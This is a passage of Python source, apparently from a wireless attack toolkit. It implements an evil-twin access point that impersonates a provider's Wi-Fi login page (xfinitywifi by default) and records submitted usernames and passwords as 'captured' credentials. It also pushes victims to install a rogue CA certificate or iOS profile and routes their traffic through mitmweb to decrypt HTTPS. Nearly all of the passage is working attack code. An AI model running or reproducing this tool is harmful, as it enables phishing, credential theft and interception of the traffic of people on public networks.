            ok(f"Mobileconfig profile generated: {mobileconfig_path}")
        else:
            warn("Failed to generate mobileconfig profile; iOS users will need manual install.")

        # ── Set up routing (NAT + redirects) ──
        await run_command(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
        if interface_b:
            await run_command(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-o", interface_b, "-j", "MASQUERADE"])
        # Only redirect HTTPS initially – HTTP will be added after login
        await run_command(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-i", interface_a,
                            "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", "8080"])

        mitm_proc = await asyncio.create_subprocess_exec(
            "mitmweb", "--mode", "transparent",
            "--listen-host", "0.0.0.0", "--listen-port", "8080",
            "--set", f"confdir={CA_DIR}",
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        )
        track_process(mitm_proc)
        ok(f"mitmweb running (transparent, port 8080). CA cert: {ca_crt}")
        info("Clients must install/trust the CA cert (served at /ca.crt) before HTTPS traffic decrypts.")

    captured = []
    http_redirect_added = [False]  # track if HTTP redirect is active

    # Branding
    brand = get_brand(ssid)
    brand_logo = brand.get("logo", "")
    brand_color = brand.get("color", "#0055aa")
    brand_title = brand.get("title", "xfinitywifi")
    brand_subtitle = brand.get("subtitle", "Secure Wi-Fi")
    portal_html = brand.get("portal_html", XFINITY_PORTAL_HTML)

    if mode == "B":
        notice = '<div class="notice"><strong>Note:</strong> After signing in, you will need to install a security certificate to enable secure browsing. The popup window cannot download files -- open this page in your regular browser (Safari/Chrome).</div>'
    else:
        notice = ""

    portal_page = portal_html.format(
        logo=brand_logo,
        color=brand_color,
        title=brand_title,
        subtitle=brand_subtitle,
        notice=notice
    )

    def get_os_button_html(os_family: str):
        if os_family == "iOS":
            if mobileconfig_path and mobileconfig_path.exists():
                return '<a href="/ca.mobileconfig" class="btn-download" download="ca.mobileconfig">Download Profile (iOS)</a>'
            else:
                return '<a href="/ca.crt" class="btn-download" download="ca.crt">Download Certificate</a>'
        elif os_family == "Android":
            return '<a href="/ca.crt" class="btn-download" download="ca.crt">Download Certificate (Android)</a>'
        elif os_family == "Windows":
            return '<a href="/ca.crt" class="btn-download" download="ca.crt">Download and Install (Windows)</a>'
        elif os_family == "macOS":
            return '<a href="/ca.crt" class="btn-download" download="ca.crt">Download and Trust (macOS)</a>'
        else:
            return '<a href="/ca.crt" class="btn-download" download="ca.crt">Download Certificate</a>'

    async def handle_client(reader, writer):
        try:
            data = await asyncio.wait_for(reader.read(8192), timeout=5)
            request = data.decode(errors="replace")
            lines = request.splitlines()
            if not lines:
                writer.close(); return
            method, path, _ = (lines[0].split() + ["", "", ""])[:3]
            user_agent = ""
            for line in lines:
                if line.lower().startswith("user-agent:"):
                    user_agent = line.split(":", 1)[1].strip()
                    break

            console.print(f"[dim]HTTP {method} {path} from {writer.get_extra_info('peername')}[/dim]")

            # ── Probe responses ──────────────────────────────────────────────
            for probe_path, (status, content_type, body, headers) in PROBE_RESPONSES.items():
                if path.startswith(probe_path):
                    if status == 204:
                        writer.write(b"HTTP/1.1 204 No Content\r\n\r\n")
                    elif status == 302:
                        resp = f"HTTP/1.1 302 Found\r\n"
                        for k, v in headers.items():
                            resp += f"{k}: {v}\r\n"
                        resp += "Content-Length: 0\r\n\r\n"
                        writer.write(resp.encode())
                    else:
                        resp = f"HTTP/1.1 {status} OK\r\n"
                        resp += f"Content-Type: {content_type}\r\n"
                        resp += f"Content-Length: {len(body)}\r\n"
                        for k, v in headers.items():
                            resp += f"{k}: {v}\r\n"
                        resp += "\r\n" + body
                        writer.write(resp.encode())
                    await writer.drain()
                    return

            # ── Certificate download ─────────────────────────────────────────
            if method == "GET" and path.startswith("/ca.crt") and ca_crt_path:
                cert_bytes = ca_crt_path.read_bytes()
                writer.write(
                    f"HTTP/1.1 200 OK\r\n"
                    f"Content-Type: application/x-x509-ca-cert\r\n"
                    f"Content-Disposition: attachment; filename=ca.crt\r\n"
                    f"Content-Length: {len(cert_bytes)}\r\n\r\n".encode() + cert_bytes
                )
                await writer.drain()
                return

            # ── Mobileconfig download ────────────────────────────────────────
            if method == "GET" and path.startswith("/ca.mobileconfig") and mobileconfig_path and mobileconfig_path.exists():
                profile_bytes = mobileconfig_path.read_bytes()
                writer.write(
                    f"HTTP/1.1 200 OK\r\n"
                    f"Content-Type: application/x-apple-aspen-config\r\n"
                    f"Content-Disposition: attachment; filename=ca.mobileconfig\r\n"
                    f"Content-Length: {len(profile_bytes)}\r\n\r\n".encode() + profile_bytes
                )
                await writer.drain()
                return

            # ── Login POST ────────────────────────────────────────────────────
            if method == "POST" and "/login" in path:
                body_idx = request.find("\r\n\r\n")
                body = request[body_idx+4:] if body_idx != -1 else ""
                fields = {}
                for p in body.split("&"):
                    if "=" in p:
                        k, v = p.split("=", 1)
                        fields[k] = v
                from urllib.parse import unquote_plus
                username = unquote_plus(fields.get("username", "")).strip()
                password = unquote_plus(fields.get("password", "")).strip()

                if username and password:
                    captured.append({"username": username, "password": password})
                    save_result(f"et_{len(captured)}", "evil_twin", rogue_bssid, ssid, f"{username}:{password}")
                    console.print(f"  [bold green][+] CREDENTIAL CAPTURED:[/bold green] {username} : {password}")

                    # ── Add HTTP redirect after successful login ──────────────
                    if mode == "B" and not http_redirect_added[0]:
                        try:
                            await run_command([
                                "sudo", "iptables", "-t", "nat", "-I", "PREROUTING", "1",
                                "-i", interface_a, "-p", "tcp", "--dport", "80",
                                "-j", "REDIRECT", "--to-port", "8080",
                            ])
                            http_redirect_added[0] = True
                            info("Client authenticated -- HTTP traffic now also routed through mitmweb.")
                        except Exception:
                            pass

                    if mode == "B":
                        os_info = detect_os(user_agent)
                        os_family = os_info.get("family", "Other")
                        os_instructions = OS_INSTRUCTIONS.get(os_family, OS_INSTRUCTIONS["Other"])
                        button_html = get_os_button_html(os_family)
                        success_body = SUCCESS_HTML_B.format(
                            os_instructions=os_instructions,
                            button_html=button_html
                        )
                    else:
                        success_body = SUCCESS_HTML_A

                    writer.write(
                        f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
                        f"Content-Length: {len(success_body)}\r\n\r\n{success_body}".encode()
                    )
                    await writer.drain()
                    return
                else:
                    # Empty submission – reload portal
                    page = portal_page
                    writer.write(
                        f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
                        f"Content-Length: {len(page)}\r\n\r\n{page}".encode()
                    )
                    await writer.drain()
                    return

            # ── Any other request – serve portal ────────────────────────────
            page = portal_page
            writer.write(
                f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n"
                f"Content-Length: {len(page)}\r\n\r\n{page}".encode()
            )
            await writer.drain()

        except Exception as e:
            console.print(f"[red]HTTP error: {e}[/red]")
        finally:
            writer.close()

    server = await asyncio.start_server(handle_client, "10.0.0.1", local_port)
    info(f"Captive portal HTTP server on 10.0.0.1:{local_port}")
    if mode == "A":
        info("Mode A: credential harvest only -- no internet is provided to clients.")
    if mode == "B":
        info("Mode B: certificate installation required for HTTPS interception.")

    try:
        with StatusLine("Rogue AP active. Ctrl+C to stop.") as status:
            while True:
                https_note = " | mitmweb decrypting HTTPS" if mode == "B" else ""
                status.update(f"-- {len(captured)} credential(s) captured{https_note}")
                await asyncio.sleep(1)
    except (KeyboardInterrupt, asyncio.CancelledError):
        warn("Stopping...")
    finally:
        server.close()
        for p in (hostapd_proc, dnsmasq_proc, mitm_proc):
            if p and p.returncode is None:
                p.terminate()
        await run_command(["sudo", "ip", "addr", "flush", "dev", interface_a])
        if mode == "B":
            try:
                await run_command(["sudo", "iptables", "-t", "nat", "-F"])
                await run_command(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])
            except Exception:
                pass
        for f in (hostapd_conf, dnsmasq_conf):
            try:
                f.unlink()
            except Exception:
                pass
        try:
            await run_command(["sudo", "systemctl", "start", "NetworkManager"])
        except Exception:
            pass

    if captured:
        ok(f"Session complete -- {len(captured)} credential(s) captured (saved to results DB).")
    else:
        info("Session complete -- no credentials captured.")